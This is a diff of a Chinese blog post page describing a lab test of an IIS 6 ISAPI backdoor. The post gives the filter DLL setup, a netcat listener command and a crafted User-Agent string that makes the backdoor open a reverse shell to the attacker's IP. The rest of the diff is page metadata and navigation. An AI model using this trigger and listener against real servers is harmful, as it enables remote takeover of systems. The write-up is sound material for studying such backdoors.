@@ -101,22 +101,22 @@
 
   
 
-<meta name="description" content="我就是爱吃醋，就是爱吃醋。 访问网页，就弹shell？唔哟本地复现了一款micropoor大牛的后门，文章结束附上下载链接。 配置环境靶机环境：IP：192.11.22.88 win 2003 Enterprise 32位 iis6.x攻击机：IP：192.11.22.55 win 7打开internet信息服务（IIS）管理器找到默认网站右键点击属性，点击ISAPI筛选器添加iis_x86.dl">
+<meta name="description" content="我就是爱吃醋，就是爱吃醋。">
 <meta name="keywords" content="windows后门,iis6.x">
 <meta property="og:type" content="article">
 <meta property="og:title" content="iis6.x后门isapi测试">
 <meta property="og:url" content="OneHone.github.io/2018/03/26/iis6.x后门isapi测试/index.html">
 <meta property="og:site_name" content="Hone">
-<meta property="og:description" content="我就是爱吃醋，就是爱吃醋。 访问网页，就弹shell？唔哟本地复现了一款micropoor大牛的后门，文章结束附上下载链接。 配置环境靶机环境：IP：192.11.22.88 win 2003 Enterprise 32位 iis6.x攻击机：IP：192.11.22.55 win 7打开internet信息服务（IIS）管理器找到默认网站右键点击属性，点击ISAPI筛选器添加iis_x86.dl">
+<meta property="og:description" content="我就是爱吃醋，就是爱吃醋。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="/images/iis6.x后门isapi测试/1.PNG">
 <meta property="og:image" content="/images/iis6.x后门isapi测试/2.PNG">
 <meta property="og:image" content="/images/iis6.x后门isapi测试/3.PNG">
 <meta property="og:image" content="/images/iis6.x后门isapi测试/4.PNG">
-<meta property="og:updated_time" content="2018-03-26T08:27:13.713Z">
+<meta property="og:updated_time" content="2018-03-29T12:27:24.256Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="iis6.x后门isapi测试">
-<meta name="twitter:description" content="我就是爱吃醋，就是爱吃醋。 访问网页，就弹shell？唔哟本地复现了一款micropoor大牛的后门，文章结束附上下载链接。 配置环境靶机环境：IP：192.11.22.88 win 2003 Enterprise 32位 iis6.x攻击机：IP：192.11.22.55 win 7打开internet信息服务（IIS）管理器找到默认网站右键点击属性，点击ISAPI筛选器添加iis_x86.dl">
+<meta name="twitter:description" content="我就是爱吃醋，就是爱吃醋。">
 <meta name="twitter:image" content="/images/iis6.x后门isapi测试/1.PNG">
 
 
@@ -430,8 +430,7 @@
       
 
       
-        <p>我就是爱吃醋，就是爱吃醋。</p>
-<p>访问网页，就弹<code>shell</code>？唔哟<br>本地复现了一款<code>micropoor</code>大牛的后门，文章结束附上下载链接。</p>
+        <p>我就是爱吃醋，就是爱吃醋。<br><a id="more"></a><br>访问网页，就弹<code>shell</code>？唔哟<br>本地复现了一款<code>micropoor</code>大牛的后门，文章结束附上下载链接。</p>
 <h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>靶机环境：IP：192.11.22.88 <code>win 2003 Enterprise 32位</code> <code>iis6.x</code><br>攻击机：IP：192.11.22.55 <code>win 7</code><br>打开<code>internet信息服务（IIS）管理器</code>找到默认网站右键点击属性，点击<code>ISAPI筛选器</code>添加<code>iis_x86.dll</code>dll文件。<br><img src="/images/iis6.x后门isapi测试/1.PNG" alt=""></p>
 <h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击机用<code>nc</code>监听端口，执行命令<code>nc.exe -lvvp 80</code><br>修改User agent内容，这里以谷歌浏览器为例，点击<code>More tools</code>然后选中<code>Network conditions</code><br><img src="/images/iis6.x后门isapi测试/2.PNG" alt=""><br>将User agent的内容改为：<code>micropoor_iis:192.11.22.55:80</code> 注：填本机IP<br><img src="/images/iis6.x后门isapi测试/3.PNG" alt=""><br>然后访问网站，成功反弹<code>shell</code><br><img src="/images/iis6.x后门isapi测试/4.PNG" alt=""></p>
 <p>强大的后门！</p>
@@ -480,6 +479,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/29/Weblogic引发的血案/" rel="prev" title="Weblogic引发的血案">
+                Weblogic引发的血案 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -562,7 +565,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-count">5</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -610,7 +613,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">8</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
